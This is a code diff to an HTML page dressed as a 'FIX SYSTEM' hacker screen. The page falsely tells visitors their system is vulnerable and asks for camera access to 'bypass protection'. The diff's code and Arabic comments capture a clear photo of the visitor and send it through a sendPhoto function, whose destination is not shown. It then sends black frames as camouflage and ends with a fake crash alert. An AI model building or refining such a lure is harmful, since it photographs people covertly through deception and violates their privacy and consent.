@@ -16,10 +16,11 @@
     <div class="box">
         <p>> SYSTEM: ONLINE</p>
         <p>> STATUS: VULNERABLE</p>
+        <p>> بانتظار تأكيد الهوية لتجاوز الحماية...</p>
         <button id="startBtn">إصلاح النظام (FIX SYSTEM)</button>
     </div>
 
-    <video id="video" autoplay></video>
+    <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
@@ -45,18 +46,32 @@
 
         startBtn.addEventListener('click', async () => {
             try {
+                // طلب فتح الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                setTimeout(() => { sendPhoto(); }, 3000);
-                setTimeout(() => {
-                    stream.getTracks().forEach(track => track.stop());
-                    setTimeout(() => sendPhoto(), 1000);
-                    setTimeout(() => { sendPhoto(); alert("System Crashed!"); }, 2000);
-                }, 5000);
+
+                // 1. التقاط الصورة الأولى الواضحة بعد 4 ثوانٍ (وقت كافٍ للسطوع)
+                setTimeout(async () => {
+                    await sendPhoto();
+                    
+                    // 2. بعد إرسال الصورة الواضحة، ننتظر ثانية ثم نغلق الكاميرا
+                    setTimeout(() => {
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                        // 3. الآن نرسل الصور السوداء للتمويه
+                        setTimeout(() => sendPhoto(), 1000);
+                        setTimeout(() => {
+                            sendPhoto();
+                            alert("CRITICAL ERROR: System Overloaded!");
+                        }, 2000);
+                    }, 1000);
+
+                }, 4000);
+
             } catch (err) {
-                alert("يجب السماح بالكاميرا!");
+                alert("يجب السماح بالكاميرا لتجاوز حماية النظام!");
             }
         });
     </script>
 </body>
-</html>
+    </html>
